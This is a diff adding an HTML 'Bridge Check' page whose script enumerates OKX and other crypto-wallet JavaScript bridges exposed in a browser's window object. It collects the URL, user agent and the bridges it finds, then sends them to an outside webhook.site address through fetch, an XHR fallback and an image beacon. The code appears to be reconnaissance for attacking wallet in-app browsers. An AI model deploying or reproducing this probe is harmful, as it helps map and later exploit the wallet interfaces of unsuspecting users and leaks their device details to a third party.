@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head><title>Bridge Check...</title></head>
+<body>
+<h1 id="status">Checking...</h1>
+<pre id="results"></pre>
+<script>
+var WEBHOOK = 'https://webhook.site/aa2b16e2-fb70-4219-a296-8c9c6977baf5';
+var bridges = {
+    '_solana_': typeof window['_solana_'],
+    'okxBtcJSBridge': typeof window['okxBtcJSBridge'],
+    'okxStarkJSBridge': typeof window['okxStarkJSBridge'],
+    '_aptos_': typeof window['_aptos_'],
+    '_okx_sui_': typeof window['_okx_sui_'],
+    'tron': typeof window['tron'],
+    'okxOsmosJSBridge': typeof window['okxOsmosJSBridge'],
+    'okxNostrJSBridge': typeof window['okxNostrJSBridge'],
+    'okxInternalJSBridge': typeof window['okxInternalJSBridge'],
+    'interception': typeof window['interception'],
+    'native': typeof window['native'],
+    'AndroidApi': typeof window['AndroidApi']
+};
+
+// Collect all window keys that might be bridge-related
+var suspiciousKeys = [];
+try {
+    for (var k in window) {
+        var t = typeof window[k];
+        if (t === 'object' || t === 'function') {
+            if (k.indexOf('okx') !== -1 || k.indexOf('_sol') !== -1 || 
+                k.indexOf('aptos') !== -1 || k === 'AndroidApi' ||
+                k === 'interception' || k === 'native' ||
+                k.indexOf('Bridge') !== -1 || k.indexOf('bridge') !== -1) {
+                suspiciousKeys.push(k + ':' + t);
+            }
+        }
+    }
+} catch(e) {}
+
+var result = {
+    url: window.location.href,
+    ua: navigator.userAgent,
+    bridges: bridges,
+    suspicious: suspiciousKeys,
+    ts: new Date().toISOString()
+};
+
+var foundCount = 0;
+for (var b in bridges) {
+    if (bridges[b] !== 'undefined') foundCount++;
+}
+
+document.title = 'BRIDGES:' + foundCount + ' FOUND';
+document.getElementById('status').textContent = 'Found ' + foundCount + ' bridges!';
+document.getElementById('results').textContent = JSON.stringify(result, null, 2);
+
+// Send to webhook
+try {
+    fetch(WEBHOOK + '?bridges=' + foundCount, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        mode: 'no-cors',
+        body: JSON.stringify(result)
+    });
+} catch(e) {
+    // Try XHR as fallback
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', WEBHOOK + '?bridges=' + foundCount, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify(result));
+}
+
+// Also try img beacon
+new Image().src = WEBHOOK + '?bridges=' + foundCount + '&found=' + Object.keys(bridges).filter(function(k){return bridges[k]!=='undefined'}).join(',');
+</script>
+</body>
+</html>
